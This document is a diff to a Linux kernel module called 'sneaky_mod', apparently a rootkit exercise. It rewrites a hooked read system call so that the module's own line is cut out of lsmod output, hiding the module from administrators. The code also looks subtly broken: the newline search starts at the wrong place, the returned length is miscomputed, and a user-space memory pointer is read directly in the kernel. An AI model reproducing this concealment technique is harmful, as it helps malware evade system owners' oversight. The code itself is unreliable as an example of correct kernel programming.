@@ -87,10 +87,16 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
 asmlinkage int (*original_read)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
+  size_t total_len = (*original_read)(regs);
   if (strstr(current->comm, "lsmod") && strstr((char *)(regs->si), "sneaky_mod")) {
-    printk(KERN_INFO "sneaky mod found");
+    char * dest = strstr((char *)(regs->si), "sneaky_mod");
+    char * line_end = strchr((char *)(regs->si), '\n');
+    char * src = line_end + 1;
+    size_t remain_len = strlen(src) + 1;
+    memmove(dest, src, remain_len);
+    total_len = remain_len;
   }
-  return (*original_read)(regs);
+  return total_len;
 }
 
 // The code that gets executed when the module is loaded
